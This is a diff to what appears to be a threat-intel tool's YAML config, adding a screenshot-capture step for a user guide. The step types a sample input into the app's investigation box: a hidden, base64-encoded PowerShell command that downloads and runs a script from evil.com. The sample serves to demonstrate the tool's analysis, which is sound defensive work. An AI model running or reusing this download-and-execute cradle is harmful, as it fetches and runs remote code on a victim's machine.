@@ -14,3 +14,19 @@ tips:
   - Configure API keys in Admin → Threat-Intel Enrichment
   - Results are cached for 24 h — set `cache_ttl_hours` to tune
 related: [candidate_explorer, taxii_push]
+
+# ------------------------------------------------------------
+# Screenshot capture — Phase 1 User Guide
+# ------------------------------------------------------------
+capture:
+  login: true
+  steps:
+    - url: /workspace
+      wait_for: '[data-testid="input-textarea"]'
+      type_into:
+        selector: '[data-testid="input-textarea"]'
+        text: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAGEALgBwAHMAMQAnACkA
+      click_before: '[data-testid="btn-auto-investigate-inline"]'
+      delay_ms: 4000
+      post_click_ms: 6000
+      full_page: true
